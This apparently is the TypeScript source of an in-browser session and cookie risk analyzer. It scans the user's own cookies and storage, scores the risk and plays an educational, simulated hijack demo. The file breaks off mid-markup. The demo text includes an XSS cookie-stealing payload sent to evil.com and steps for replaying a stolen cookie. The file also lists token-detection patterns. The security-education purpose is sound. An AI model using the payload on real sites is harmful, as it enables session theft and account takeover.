import { useState, useEffect, useRef } from "react";
import {
  Lock, Cookie, Shield, AlertTriangle, CheckCircle, XCircle,
  Eye, Database, Globe, Wifi, Key, RefreshCw, ChevronDown,
  ChevronUp, Info, Smartphone, ExternalLink, Terminal,
  Zap, X, SkipForward,
} from "lucide-react";
import RiskGauge from "@/components/common/RiskGauge";
import ProgressBar from "@/components/common/ProgressBar";
import { useAuth } from "@/contexts/AuthContext";

interface CookieEntry {
  name: string;
  value: string;
  length: number;
  looksLikeSession: boolean;
  looksLikeAuth: boolean;
  isHttpOnly: boolean;
  isSecure: boolean;
  service: string | null;
}

interface StorageEntry {
  key: string;
  valuePreview: string;
  length: number;
  looksLikeToken: boolean;
  looksLikeJWT: boolean;
  service: string | null;
}

interface ScanResults {
  riskScore: number;
  connection: {
    isHTTPS: boolean;
    protocol: string;
    host: string;
    urlHasToken: boolean;
    tokenParams: string[];
  };
  cookies: {
    raw: CookieEntry[];
    total: number;
    sessionLike: number;
    authLike: number;
    insecure: number;
  };
  localStorage: {
    entries: StorageEntry[];
    total: number;
    tokenCount: number;
    jwtCount: number;
  };
  sessionStorage: {
    entries: StorageEntry[];
    total: number;
    tokenCount: number;
  };
  browserProfile: {
    userAgent: string;
    platform: string;
    cookiesEnabled: boolean;
    doNotTrack: string | null;
    languages: readonly string[];
    hardwareConcurrency: number;
    touchPoints: number;
    hasWebRTC: boolean;
    hasServiceWorker: boolean;
    thirdPartyCookiesLikely: boolean;
  };
  servicesAtRisk: Array<{
    name: string;
    category: string;
    risk: "high" | "medium" | "low";
    reason: string;
  }>;
  recommendations: Array<{
    text: string;
    priority: "high" | "medium" | "low";
    icon: string;
  }>;
}

const SESSION_PATTERNS: Record<string, string[]> = {
  "session": ["sess", "session", "sid", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "connect.sid"],
  "auth": ["auth", "token", "jwt", "bearer", "access", "refresh", "login", "user_id", "uid", "identity"],
  "tracking": ["_ga", "_gid", "_fbp", "_fbc", "fbm_", "__utm", "ajs_", "amplitude"],
  "csrf": ["csrf", "xsrf", "_token", "authenticity_token"],
};

const SERVICE_FINGERPRINTS: Record<string, { name: string; category: string }> = {
  "_ga": { name: "Google Analytics", category: "Tracking" },
  "_gid": { name: "Google Analytics", category: "Tracking" },
  "_fbp": { name: "Facebook Pixel", category: "Advertising" },
  "_fbc": { name: "Facebook", category: "Social" },
  "PHPSESSID": { name: "PHP Application", category: "Session" },
  "JSESSIONID": { name: "Java Application", category: "Session" },
  "ASP.NET_SessionId": { name: "ASP.NET Application", category: "Session" },
  "connect.sid": { name: "Node.js/Express", category: "Session" },
  "__stripe_mid": { name: "Stripe", category: "Payment" },
  "__stripe_sid": { name: "Stripe", category: "Payment" },
  "intercom-session": { name: "Intercom", category: "Support" },
  "intercom-id": { name: "Intercom", category: "Support" },
  "_shopify_": { name: "Shopify", category: "E-commerce" },
  "wordpress_": { name: "WordPress", category: "CMS" },
  "wp-settings": { name: "WordPress", category: "CMS" },
};

const TOKEN_REGEX = /^[A-Za-z0-9+/=]{20,}$|^[A-Za-z0-9\-_.]{32,}$/;
const JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]*$/;
const URL_TOKEN_PARAMS = ["token", "access_token", "auth_token", "session_id", "sid", "key", "apikey", "api_key", "secret"];

function identifyService(key: string): string | null {
  for (const [pattern, info] of Object.entries(SERVICE_FINGERPRINTS)) {
    if (key.toLowerCase().includes(pattern.toLowerCase())) return info.name;
  }
  return null;
}

function looksLikeSessionCookie(name: string): boolean {
  const n = name.toLowerCase();
  return SESSION_PATTERNS.session.some(p => n.includes(p.toLowerCase()));
}

function looksLikeAuthCookie(name: string): boolean {
  const n = name.toLowerCase();
  return SESSION_PATTERNS.auth.some(p => n.includes(p.toLowerCase()));
}

function parseCookies(): CookieEntry[] {
  if (!document.cookie) return [];
  return document.cookie.split(";").map(raw => {
    const [name, ...rest] = raw.trim().split("=");
    const value = rest.join("=");
    return {
      name: name.trim(),
      value: value.slice(0, 40) + (value.length > 40 ? "…" : ""),
      length: value.length,
      looksLikeSession: looksLikeSessionCookie(name.trim()),
      looksLikeAuth: looksLikeAuthCookie(name.trim()),
      isHttpOnly: false,
      isSecure: false,
      service: identifyService(name.trim()),
    };
  }).filter(c => c.name);
}

function scanStorage(storage: Storage): StorageEntry[] {
  const entries: StorageEntry[] = [];
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    if (!key) continue;
    const val = storage.getItem(key) || "";
    entries.push({
      key,
      valuePreview: val.slice(0, 60) + (val.length > 60 ? "…" : ""),
      length: val.length,
      looksLikeToken: TOKEN_REGEX.test(val),
      looksLikeJWT: JWT_REGEX.test(val),
      service: identifyService(key),
    });
  }
  return entries;
}

function detectUrlTokens(): string[] {
  const params = new URLSearchParams(window.location.search);
  const found: string[] = [];
  for (const p of URL_TOKEN_PARAMS) {
    if (params.has(p)) found.push(p);
  }
  return found;
}

function buildServicesAtRisk(
  cookies: CookieEntry[],
  ls: StorageEntry[],
  ss: StorageEntry[]
): Array<{ name: string; category: string; risk: "high" | "medium" | "low"; reason: string }> {
  const seen = new Set<string>();
  const services: Array<{ name: string; category: string; risk: "high" | "medium" | "low"; reason: string }> = [];

  const add = (name: string, category: string, risk: "high" | "medium" | "low", reason: string) => {
    if (!seen.has(name)) {
      seen.add(name);
      services.push({ name, category, risk, reason });
    }
  };

  for (const c of cookies) {
    if (c.service) {
      const cat = Object.values(SERVICE_FINGERPRINTS).find(v => v.name === c.service)?.category || "Unknown";
      if (c.looksLikeSession || c.looksLikeAuth) {
        add(c.service, cat, "high", "Session/auth cookie found - can be used to hijack login");
      } else {
        add(c.service, cat, "medium", "Tracking cookie present - behavior can be profiled");
      }
    }
  }

  for (const e of [...ls, ...ss]) {
    if (e.service) {
      add(e.service, "Storage", e.looksLikeJWT ? "high" : "medium",
        e.looksLikeJWT ? "JWT token in storage - readable by any script on this page" : "Service data stored client-side");
    }
    if (e.looksLikeJWT) {
      add("Unknown Service (JWT)", "Storage", "high", "JWT token found - could contain identity claims");
    }
  }

  if (!window.location.protocol.includes("https")) {
    add("This Page", "Connection", "high", "Page loaded over HTTP - cookies can be intercepted in transit");
  }

  return services.slice(0, 8);
}

function computeRisk(
  cookies: CookieEntry[],
  ls: StorageEntry[],
  ss: StorageEntry[],
  isHTTPS: boolean,
  urlHasToken: boolean
): number {
  let score = 0;

  if (!isHTTPS) score += 30;
  if (urlHasToken) score += 20;

  const authCookies = cookies.filter(c => c.looksLikeAuth || c.looksLikeSession);
  score += Math.min(authCookies.length * 8, 24);

  const jwtInStorage = [...ls, ...ss].filter(e => e.looksLikeJWT);
  score += Math.min(jwtInStorage.length * 12, 24);

  const tokenInStorage = [...ls, ...ss].filter(e => e.looksLikeToken && !e.looksLikeJWT);
  score += Math.min(tokenInStorage.length * 5, 15);

  if (cookies.length > 10) score += 8;

  return Math.min(score, 95);
}

function buildRecommendations(
  isHTTPS: boolean,
  urlHasToken: boolean,
  authCookies: number,
  jwtCount: number,
  doNotTrack: string | null,
  thirdParty: boolean
): Array<{ text: string; priority: "high" | "medium" | "low"; icon: string }> {
  const recs: Array<{ text: string; priority: "high" | "medium" | "low"; icon: string }> = [];

  if (!isHTTPS) recs.push({ text: "Only submit credentials or tokens on HTTPS pages - HTTP transmits data in plaintext", priority: "high", icon: "lock" });
  if (urlHasToken) recs.push({ text: "Never put session tokens in URLs - they appear in server logs, browser history, and referrer headers", priority: "high", icon: "alert" });
  if (jwtCount > 0) recs.push({ text: "JWTs in localStorage are accessible to any JavaScript on the page - prefer HttpOnly cookies for auth tokens", priority: "high", icon: "key" });
  if (authCookies > 0) recs.push({ text: "Regularly log out of services you are not actively using to reduce active session exposure", priority: "medium", icon: "shield" });
  if (!doNotTrack) recs.push({ text: "Enable 'Do Not Track' in your browser settings to signal tracking opt-out", priority: "low", icon: "eye" });
  if (thirdParty) recs.push({ text: "Enable 'Block third-party cookies' in your browser to prevent cross-site tracking", priority: "medium", icon: "globe" });

  recs.push({ text: "Clear browser cookies periodically, especially after using public or shared computers", priority: "medium", icon: "refresh" });
  recs.push({ text: "Use a password manager and unique credentials per site to limit breach impact", priority: "low", icon: "key" });
  recs.push({ text: "Consider using private/incognito mode for sensitive browsing - sessions are cleared on close", priority: "low", icon: "eye" });

  return recs.slice(0, 7);
}

const RecIcon = ({ icon }: { icon: string }) => {
  const cls = "w-4 h-4 flex-shrink-0";
  switch (icon) {
    case "lock": return <Lock className={cls} />;
    case "alert": return <AlertTriangle className={cls} />;
    case "key": return <Key className={cls} />;
    case "shield": return <Shield className={cls} />;
    case "eye": return <Eye className={cls} />;
    case "globe": return <Globe className={cls} />;
    case "refresh": return <RefreshCw className={cls} />;
    default: return <Shield className={cls} />;
  }
};

const RiskBadge = ({ risk }: { risk: "high" | "medium" | "low" }) => {
  if (risk === "high") return <span className="badge-danger">High Risk</span>;
  if (risk === "medium") return <span className="badge-warning">Medium</span>;
  return <span className="badge-success">Low</span>;
};


function buildAttackSteps(cookie: CookieEntry) {
  const val = cookie.value.length > 30 ? cookie.value.slice(0, 30) + "…" : cookie.value;
  const service = cookie.service || "Target Website";
  const host = window.location.host;

  const base = [
    {
      phase: "RECONNAISSANCE",
      color: "text-yellow-400",
      icon: "👁",
      title: "Cookie Identified",
      lines: [
        `$ scanning ${host} for session cookies...`,
        `> Found: ${cookie.name}`,
        `> Value: ${val}`,
        `> Service: ${service}`,
        `> Type: ${cookie.looksLikeAuth ? "Auth Token" : cookie.looksLikeSession ? "Session ID" : "Tracking Cookie"}`,
        `> This cookie authenticates you with ${service}`,
      ],
    },
    {
      phase: "INTERCEPTION",
      color: "text-orange-400",
      icon: "🎣",
      title: "Cookie Stolen",
      lines: [
        `$ attacker injects XSS payload into page...`,
        `> <script>fetch('https://evil.com/steal?c='+document.cookie)</script>`,
        `> Request received at attacker server:`,
        `> GET /steal?c=${cookie.name}=${val}`,
        `> ✓ Cookie successfully exfiltrated`,
        `> Attacker now has your ${service} session`,
      ],
    },
    {
      phase: "INJECTION",
      color: "text-red-400",
      icon: "💉",
      title: "Attacker Injects Cookie",
      lines: [
        `$ attacker opens browser console on ${service}...`,
        `> document.cookie = "${cookie.name}=${val}; path=/"`,
        `> Cookie set successfully ✓`,
        `> Browser now holds victim's session`,
        `> No password required`,
        `> No 2FA required`,
      ],
    },
    {
      phase: "EXPLOITATION",
      color: "text-red-500",
      icon: "🔓",
      title: "Session Hijacked",
      lines: [
        `$ attacker navigates to ${service}...`,
        `> GET /dashboard HTTP/1.1`,
        `> Host: ${service.toLowerCase().replace(/ /g, "")}.com`,
        `> Cookie: ${cookie.name}=${val}`,
        ``,
        `> HTTP/1.1 200 OK - Welcome back! ✓`,
        `> Server accepted stolen session`,
        `> Account fully compromised`,
      ],
    },
    {
      phase: "ACCESS GRANTED",
      color: "text-green-400",
      icon: "💀",
      title: "Full Account Access",
      lines: [
        `> Attacker is now logged in as YOU`,
        `> Can view all your data on ${service}`,
        `> Can change email, password, payment info`,
        `> Can make purchases, send messages`,
        `> Original session still active - victim unaware`,
        ``,
        `> Session duration: Until cookie expires`,
        `> Defence: HttpOnly cookies prevent this attack`,
      ],
    },
  ];

  if (cookie.name.includes("stripe")) {
    base[4].lines = [
      `> Attacker linked to your payment identity`,
      `> Stripe device fingerprint compromised`,
      `> Future transactions linked to attacker device`,
      `> Fraud detection may be bypassed`,
      `> Your saved cards may be accessible`,
      ``,
      `> Defence: Clear Stripe cookies after checkout`,
    ];
  }

  return base;
}

interface AttackDemoProps {
  cookie: CookieEntry;
  onClose: () => void;
}

function CookieAttackDemo({ cookie, onClose }: AttackDemoProps) {
  const steps = buildAttackSteps(cookie);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedLines, setDisplayedLines] = useState<string[]>([]);
  const [lineIndex, setLineIndex] = useState(0);
  const [charIndex, setCharIndex] = useState(0);
  const [isDone, setIsDone] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);
  const mounted = useRef(true);

  useEffect(() => {
    mounted.current = true;
    return () => { mounted.current = false; };
  }, []);

  useEffect(() => {
    if (isDone) return;
    const step = steps[currentStep];
    if (!step) return;

    if (lineIndex >= step.lines.length) {
      const t = setTimeout(() => {
        if (!mounted.current) return;
        if (currentStep < steps.length - 1) {
          setCurrentStep(s => s + 1);
          setDisplayedLines([]);
          setLineIndex(0);
          setCharIndex(0);
        } else {
          setIsDone(true);
        }
      }, 1200);
      return () => clearTimeout(t);
    }

    const line = step.lines[lineIndex];

    if (charIndex < line.length) {
      const speed = line.startsWith(">") ? 18 : 12;
      const t = setTimeout(() => {
        if (!mounted.current) return;
        setDisplayedLines(prev => {
          const next = [...prev];
          next[lineIndex] = (next[lineIndex] || "") + line[charIndex];
          return next;
        });
        setCharIndex(c => c + 1);
      }, speed);
      return () => clearTimeout(t);
    } else {
      const t = setTimeout(() => {
        if (!mounted.current) return;
        setLineIndex(l => l + 1);
        setCharIndex(0);
      }, 80);
      return () => clearTimeout(t);
    }
  }, [currentStep, lineIndex, charIndex, isDone]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [displayedLines]);

  const skipToEnd = () => {
    if (isDone) return;
    const step = steps[currentStep];
    setDisplayedLines(step.lines);
    setLineIndex(step.lines.length);
    setCharIndex(0);
  };

  const progress = ((currentStep + (lineIndex / (steps[currentStep]?.lines.length || 1))) / steps.length) * 100;

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 backdrop-blur-md"
      style={{ background: "rgba(5, 10, 25, 0.88)" }}
    >
      <div
        className="w-full max-w-2xl rounded-xl overflow-hidden shadow-2xl border"
        style={{ background: "hsl(230 55% 7%)", borderColor: "rgba(201,168,76,0.2)" }}
      >

        {/* Title bar */}
        <div
          className="flex items-center justify-between px-4 py-3 border-b"
          style={{ background: "hsl(230 50% 9%)", borderColor: "rgba(201,168,76,0.15)" }}
        >
          <div className="flex items-center gap-3">
            <div className="flex gap-1.5">
              <div className="w-3 h-3 rounded-full bg-red-500" />
              <div className="w-3 h-3 rounded-full bg-yellow-500" />
              <div className="w-3 h-3 rounded-full bg-green-500" />
            </div>
            <div className="flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5 text-muted-foreground" />
              <span className="text-xs text-muted-foreground font-mono">
                session_hijack_demo - {cookie.name}
              </span>
            </div>
          </div>
          <button onClick={onClose} className="text-muted-foreground hover:text-foreground transition-colors">
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Progress bar */}
        <div className="h-1" style={{ background: "hsl(230 50% 12%)" }}>
          <div
            className="h-full bg-gradient-to-r from-red-500 to-orange-400 transition-all duration-300"
            style={{ width: `${progress}%` }}
          />
        </div>

        {/* Step indicators */}
        <div
          className="flex px-4 py-3 gap-2 border-b"
          style={{ background: "hsl(230 55% 8%)", borderColor: "rgba(201,168,76,0.1)" }}
        >
          {steps.map((s, i) => (
            <div
              key={i}
              className={`flex-1 text-center text-[10px] font-mono py-1 rounded transition-all ${
                i === currentStep
                  ? `${s.color} border`
                  : i < currentStep
                  ? "text-green-500/60"
                  : "text-muted-foreground/30"
              }`}
              style={i === currentStep ? { background: "rgba(255,255,255,0.04)", borderColor: "rgba(255,255,255,0.1)" } : {}}
            >
              {i < currentStep ? "✓" : s.icon} {s.phase}
            </div>
          ))}
        </div>

        {/* Terminal */}
        <div
          ref={terminalRef}
          className="font-mono text-sm p-5 h-64 overflow-y-auto space-y-1"
          style={{ background: "hsl(230 55% 7%)" }}
        >
          <p className={`text-base font-bold mb-3 ${steps[currentStep]?.color}`}>
            [{steps[currentStep]?.icon}] {steps[currentStep]?.title}
          </p>
          {displayedLines.map((line, i) => {
            const l = line ?? "";
            return (
            <p
              key={i}
              className={`leading-relaxed ${
                l.startsWith("$") ? "text-green-400" :
                l.startsWith(">") ? "text-slate-300" :
                l === "" ? "h-2" :
                "text-slate-500"
              }`}
            >
              {l}
              {i === displayedLines.length - 1 && !isDone && (
                <span className="animate-pulse text-green-400 ml-0.5">█</span>
              )}
            </p>
            );
          })}
          {isDone && (
            <div className="mt-4 p-3 rounded bg-red-950/40 border border-red-500/30">
              <p className="text-red-400 font-bold text-sm">⚠ ATTACK COMPLETE - Session fully compromised</p>
              <p className="text-slate-400 text-xs mt-1">
                Defence: Ensure cookies use HttpOnly + Secure + SameSite=Strict flags
              </p>
            </div>
          )}
        </div>

        {/* Controls */}
        <div
          className="flex items-center justify-between px-5 py-3 border-t"
          style={{ background: "hsl(230 55% 8%)", borderColor: "rgba(201,168,76,0.15)" }}
        >
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
            LIVE SIMULATION - no real attack occurring
          </div>
          <div className="flex gap-2">
            {!isDone && (
              <button
                onClick={skipToEnd}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded text-xs text-muted-foreground transition-colors hover:text-foreground"
                style={{ background: "rgba(255,255,255,0.04)" }}
                onMouseEnter={e => (e.currentTarget.style.background = "rgba(255,255,255,0.08)")}
                onMouseLeave={e => (e.currentTarget.style.background = "rgba(255,255,255,0.04)")}
              >
                <SkipForward className="w-3.5 h-3.5" />
                Skip step
              </button>
            )}
            <button
              onClick={onClose}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-primary/20 hover:bg-primary/30 text-xs text-primary transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

const SessionScan = () => {
  const [isScanning, setIsScanning]     = useState(false);
  const [showResults, setShowResults]   = useState(false);
  const [results, setResults]           = useState<ScanResults | null>(null);
  const [showAllCookies, setShowAllCookies] = useState(false);
  const [showAllStorage, setShowAllStorage] = useState(false);
  const [demoCookie, setDemoCookie]     = useState<CookieEntry | null>(null);
  const { saveScanResult } = useAuth();

  const handleScan = () => {
    setIsScanning(true);
    setShowResults(false);

    setTimeout(() => {
      const cookies = parseCookies();
      let lsEntries: StorageEntry[] = [];
      let ssEntries: StorageEntry[] = [];

      try { lsEntries = scanStorage(localStorage); } catch { /* sandboxed */ }
      try { ssEntries = scanStorage(sessionStorage); } catch { /* sandboxed */ }

      const isHTTPS = window.location.protocol === "https:";
      const urlTokens = detectUrlTokens();
      const nav = navigator as any;

      const browserProfile = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency || 0,
        touchPoints: navigator.maxTouchPoints || 0,
        hasWebRTC: !!(window.RTCPeerConnection),
        hasServiceWorker: "serviceWorker" in navigator,
        thirdPartyCookiesLikely: !(nav.cookieStore),
      };

      const authCookies = cookies.filter(c => c.looksLikeAuth || c.looksLikeSession);
      const jwtTotal = [...lsEntries, ...ssEntries].filter(e => e.looksLikeJWT).length;
      const riskScore = computeRisk(cookies, lsEntries, ssEntries, isHTTPS, urlTokens.length > 0);

      const res: ScanResults = {
        riskScore,
        connection: {
          isHTTPS,
          protocol: window.location.protocol,
          host: window.location.host,
          urlHasToken: urlTokens.length > 0,
          tokenParams: urlTokens,
        },
        cookies: {
          raw: cookies,
          total: cookies.length,
          sessionLike: cookies.filter(c => c.looksLikeSession).length,
          authLike: cookies.filter(c => c.looksLikeAuth).length,
          insecure: cookies.filter(c => !c.isSecure).length,
        },
        localStorage: {
          entries: lsEntries,
          total: lsEntries.length,
          tokenCount: lsEntries.filter(e => e.looksLikeToken).length,
          jwtCount: lsEntries.filter(e => e.looksLikeJWT).length,
        },
        sessionStorage: {
          entries: ssEntries,
          total: ssEntries.length,
          tokenCount: ssEntries.filter(e => e.looksLikeToken).length,
        },
        browserProfile,
        servicesAtRisk: buildServicesAtRisk(cookies, lsEntries, ssEntries),
        recommendations: buildRecommendations(
          isHTTPS,
          urlTokens.length > 0,
          authCookies.length,
          jwtTotal,
          browserProfile.doNotTrack,
          browserProfile.thirdPartyCookiesLikely
        ),
      };

      saveScanResult("session", {
        riskScore,
        cookieCount: cookies.length,
        storageTokens: res.localStorage.tokenCount + res.sessionStorage.tokenCount,
        isHTTPS,
      });

      setResults(res);
      setIsScanning(false);
      setShowResults(true);
    }, 1200);
  };

  const riskLabel = (score: number) => {
    if (score >= 70) return { text: "High Risk", cls: "text-destructive" };
    if (score >= 40) return { text: "Moderate Risk", cls: "text-warning" };
    return { text: "Low Risk", cls: "text-success" };
  };

  return (
    <>
    {demoCookie && <CookieAttackDemo cookie={demoCookie} onClose={() => setDemoCookie(null)} />}
    <div className="min-h-screen py-8">
      <div className="container mx-auto px-4">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">

          {/* ── Left Panel ── */}
          <div className="space-y-6">
            <div className="glass-card p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-3 rounded-xl bg-primary/10">
                  <Lock className="w-8 h-8 text-primary" />
                </div>
                <div>
                  <h1 className="text-2xl font-bold">Session & Cookie Risk Analyzer</h1>
                  <p className="text-muted-foreground text-sm">
                    Scan your browser's session exposure in real time
                  </p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="p-4 rounded-lg bg-muted/30 border border-border/30">
                  <p className="text-sm font-medium mb-2 flex items-center gap-2">
                    <Info className="w-4 h-4 text-primary" />
                    What this scans
                  </p>
                  <ul className="space-y-1.5 text-sm text-muted-foreground">
                    {[
                      "Browser cookies - session IDs, auth tokens, trackers",
                      "localStorage & sessionStorage for sensitive keys",
                      "Connection security (HTTPS / HTTP)",
                      "URL parameters that expose session tokens",
                      "Browser fingerprint & privacy settings",
                    ].map((item, i) => (
                      <li key={i} className="flex items-start gap-2">
                        <CheckCircle className="w-3.5 h-3.5 text-primary mt-0.5 flex-shrink-0" />
                        {item}
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="p-4 rounded-lg bg-warning/10 border border-warning/20">
                  <p className="text-xs text-muted-foreground flex items-start gap-2">
                    <Shield className="w-3.5 h-3.5 text-warning mt-0.5 flex-shrink-0" />
                    All analysis runs entirely in your browser. No data is sent to any server.
                  </p>
                </div>

                <button
                  onClick={handleScan}
                  disabled={isScanning}
                  className="btn-primary w-full flex items-center justify-center gap-2"
                >
                  {isScanning ? (
                    <>
                      <RefreshCw className="w-5 h-5 animate-spin" />
                      Scanning browser…
                    </>
                  ) : (
                    <>
                      <Eye className="w-5 h-5" />
                      Scan My Session
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Education card */}
            <div className="glass-card p-6">
              <h3 className="font-semibold mb-4 flex items-center gap-2">
                <AlertTriangle className="w-5 h-5 text-warning" />
                How Session Hijacking Works
              </h3>
              <div className="space-y-3 text-sm text-muted-foreground">
                {[
                  {
                    title: "Cookie Theft",
                    desc: "Attackers steal session cookies via XSS, man-in-the-middle on HTTP, or network sniffing on public Wi-Fi.",
                  },
                  {
                    title: "Token Leakage",
                    desc: "JWTs stored in localStorage can be read by any JavaScript on your page - including injected ad scripts.",
                  },
                  {
                    title: "URL Token Exposure",
                    desc: "Session tokens in URLs appear in server logs, browser history, and are sent in Referer headers to third parties.",
                  },
                  {
                    title: "Session Fixation",
                    desc: "An attacker forces your browser to use a known session ID before you log in, gaining instant access after authentication.",
                  },
                ].map((item, i) => (
                  <div key={i} className="p-3 rounded-lg bg-muted/30">
                    <p className="font-medium text-foreground mb-1">{item.title}</p>
                    <p>{item.desc}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* ── Right Panel ── */}
          {!showResults && !isScanning ? (
            <div className="flex items-center justify-center">
              <div className="text-center glass-card p-12 w-full">
                <Lock className="w-16 h-16 text-muted-foreground/30 mx-auto mb-4" />
                <h3 className="text-xl font-semibold mb-2">Ready to Scan</h3>
                <p className="text-muted-foreground">
                  Click "Scan My Session" to analyze your browser's cookies, storage tokens, and connection security.
                </p>
              </div>
            </div>
          ) : isScanning ? (
            <div className="flex items-center justify-center">
              <div className="text-center glass-card p-12 w-full">
                <RefreshCw className="w-12 h-12 text-primary mx-auto mb-4 animate-spin" />
                <h3 className="text-lg font-semibold mb-2">Analyzing your session…</h3>
                <div className="space-y-2 text-sm text-muted-foreground">
                  {["Reading browser cookies", "Scanning localStorage", "Checking connection security", "Building risk profile"].map((s, i) => (
                    <p key={i} className="flex items-center justify-center gap-2">
                      <CheckCircle className="w-3.5 h-3.5 text-primary" />
                      {s}
                    </p>
                  ))}
                </div>
              </div>
            </div>
          ) : results && (
            <div className="space-y-6 animate-fade-in">

              {/* Risk Overview */}
              <div className="glass-card p-6">
                <div className="flex items-center justify-between mb-6">
                  <div>
                    <h2 className="text-lg font-semibold">Session Hijack Risk</h2>
                    <p className={`text-sm font-medium mt-0.5 ${riskLabel(results.riskScore).cls}`}>
                      {riskLabel(results.riskScore).text}
                    </p>
                  </div>
                  <RiskGauge score={results.riskScore} size="sm" label="Risk" />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  {[
                    { label: "Cookies Found", value: results.cookies.total, icon: Cookie, warn: results.cookies.authLike > 0 },
                    { label: "Auth/Session Cookies", value: results.cookies.authLike + results.cookies.sessionLike, icon: Key, warn: results.cookies.authLike > 0 },
                    { label: "localStorage Tokens", value: results.localStorage.tokenCount, icon: Database, warn: results.localStorage.jwtCount > 0 },
                    { label: "JWT Tokens", value: results.localStorage.jwtCount + results.sessionStorage.entries.filter(e => e.looksLikeJWT).length, icon: Shield, warn: true },
                  ].map((stat, i) => (
                    <div key={i} className={`p-3 rounded-lg ${stat.warn && stat.value > 0 ? "bg-destructive/10 border border-destructive/20" : "bg-muted/30"}`}>
                      <div className="flex items-center gap-2 mb-1">
                        <stat.icon className={`w-4 h-4 ${stat.warn && stat.value > 0 ? "text-destructive" : "text-muted-foreground"}`} />
                        <span className="text-xs text-muted-foreground">{stat.label}</span>
                      </div>
                      <p className={`text-2xl font-bold ${stat.warn && stat.value > 0 ? "text-destructive" : "text-foreground"}`}>
                        {stat.value}
                      </p>
                    </div>
                  ))}
                </div>
              </div>

              {/* Connection Security */}
              <div className="glass-card p-6">
                <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Wifi className="w-5 h-5 text-primary" />
                  Connection Security
                </h2>
                <div className="space-y-3">
                  <div className={`flex items-center justify-between p-3 rounded-lg ${results.connection.isHTTPS ? "bg-success/10 border border-success/20" : "bg-destructive/10 border border-destructive/20"}`}>
                    <div className="flex items-center gap-3">
                      {results.connection.isHTTPS ? <CheckCircle className="w-5 h-5 text-success" /> : <XCircle className="w-5 h-5 text-destructive" />}
                      <div>
                        <p className="text-sm font-medium">Protocol</p>
                        <p className="text-xs text-muted-foreground font-mono">{results.connection.host}</p>
                      </div>
                    </div>
                    <span className={results.connection.isHTTPS ? "badge-success" : "badge-danger"}>
                      {results.connection.protocol.toUpperCase().replace(":", "")}
                    </span>
                  </div>

                  <div className={`flex items-center justify-between p-3 rounded-lg ${results.connection.urlHasToken ? "bg-destructive/10 border border-destructive/20" : "bg-success/10 border border-success/20"}`}>
                    <div className="flex items-center gap-3">
                      {results.connection.urlHasToken ? <XCircle className="w-5 h-5 text-destructive" /> : <CheckCircle className="w-5 h-5 text-success" />}
                      <div>
                        <p className="text-sm font-medium">URL Token Exposure</p>
                        {results.connection.urlHasToken && (
                          <p className="text-xs text-muted-foreground">Params: {results.connection.tokenParams.join(", ")}</p>
                        )}
                      </div>
                    </div>
                    <span className={results.connection.urlHasToken ? "badge-danger" : "badge-success"}>
                      {results.connection.urlHasToken ? "Exposed" : "Clean"}
                    </span>
                  </div>

                  <div className={`flex items-center justify-between p-3 rounded-lg ${results.browserProfile.cookiesEnabled ? "bg-warning/10 border border-warning/20" : "bg-success/10 border border-success/20"}`}>
                    <div className="flex items-center gap-3">
                      <Cookie className="w-5 h-5 text-warning" />
                      <p className="text-sm font-medium">Cookies Enabled</p>
                    </div>
                    <span className={results.browserProfile.cookiesEnabled ? "badge-warning" : "badge-success"}>
                      {results.browserProfile.cookiesEnabled ? "Yes" : "No"}
                    </span>
                  </div>

                  <div className={`flex items-center justify-between p-3 rounded-lg ${results.browserProfile.doNotTrack === "1" ? "bg-success/10 border border-success/20" : "bg-muted/30"}`}>
                    <div className="flex items-center gap-3">
                      <Eye className="w-5 h-5 text-muted-foreground" />
                      <p className="text-sm font-medium">Do Not Track</p>
                    </div>
                    <span className={results.browserProfile.doNotTrack === "1" ? "badge-success" : "badge-warning"}>
                      {results.browserProfile.doNotTrack === "1" ? "Enabled" : "Disabled"}
                    </span>
                  </div>
                </div>
              </div>

              {/* Cookies Detail */}
              {results.cookies.total > 0 && (
                <div className="glass-card p-6">
                  <div className="flex items-center justify-between mb-4">
                    <h2 className="text-lg font-semibold flex items-center gap-2">
                      <Cookie className="w-5 h-5 text-primary" />
                      Detected Cookies
                      <span className="text-sm font-normal text-muted-foreground">({results.cookies.total})</span>
                    </h2>
                    <div className="flex gap-2">
                      {results.cookies.authLike > 0 && <span className="badge-danger">{results.cookies.authLike} Auth</span>}
                      {results.cookies.sessionLike > 0 && <span className="badge-warning">{results.cookies.sessionLike} Session</span>}
                    </div>
                  </div>
                  <div className="space-y-2">
                    {(showAllCookies ? results.cookies.raw : results.cookies.raw.slice(0, 5)).map((c, i) => (
                      <div key={i} className={`p-3 rounded-lg text-sm ${c.looksLikeAuth || c.looksLikeSession ? "bg-destructive/10 border border-destructive/20" : "bg-muted/30"}`}>
                        <div className="flex items-center justify-between mb-1">
                          <span className="font-mono font-medium text-xs">{c.name}</span>
                          <div className="flex items-center gap-1">
                            {c.service && <span className="text-xs px-1.5 py-0.5 rounded bg-primary/10 text-primary">{c.service}</span>}
